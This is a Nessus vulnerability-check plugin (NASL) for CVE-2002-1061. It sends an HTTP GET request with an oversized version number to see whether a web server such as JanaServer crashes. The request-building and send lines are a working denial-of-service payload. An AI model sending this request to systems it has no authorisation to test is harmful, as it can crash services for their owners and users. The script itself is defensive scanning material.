#
# (C) Tenable Network Security, Inc.
#
# References:
# Date:  Fri, 26 Jul 2002 12:12:45 +0400
# From: "3APA3A" <3APA3A@SECURITY.NNOV.RU>
# To: bugtraq@securityfocus.com
# Subject: SECURITY.NNOV: multiple vulnerabilities in JanaServer
#
# Affected:
# JanaServer 2.2.1 and prior
# JanaServer 1.46 and prior
# 

include("compat.inc");

if(description)
{
 script_id(11061);
 script_version ("$Revision: 1.24 $");
 script_cve_id("CVE-2002-1061");
 script_bugtraq_id(5319, 5320, 5322, 5324);
 script_xref(name:"OSVDB", value:"2103");

 script_name(english:"Web Server HTTP GET Request Version Number Handling Remote Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host is running a web server with a remote
buffer overflow vulnerability." );
 script_set_attribute(attribute:"description", value:
"It was possible to kill the web server by sending an HTTP GET
request with a long major version number.

A cracker may exploit this vulnerability to make your web server
crash continually or even execute arbitrary code on your system." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2002-07/0329.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade your software or protect it with a filtering reverse proxy." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );

script_end_attributes();

 
 script_summary(english:"Tries to crash the web server with a long HTTP version");
 
 script_category(ACT_DENIAL);
# All the www_too_long_*.nasl scripts were first declared as 
# ACT_DESTRUCTIVE_ATTACK, but many web servers are vulnerable to them:
# The web server might be killed by those generic tests before Nessus 
# has a chance to perform known attacks for which a patch exists
# As ACT_DENIAL are performed one at a time (not in parallel), this reduces
# the risk of false positives.
 
 script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_dependencies("no404.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

########

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) exit(0);

r = string("GET / HTTP/", crap(2048), ".O\r\n\r\n");

port = get_http_port(default:80);

if(http_is_dead(port:port))exit(0);

w = http_send_recv_buf(port: port, data: r);

if(http_is_dead(port: port, retry: 3)) { security_hole(port); }
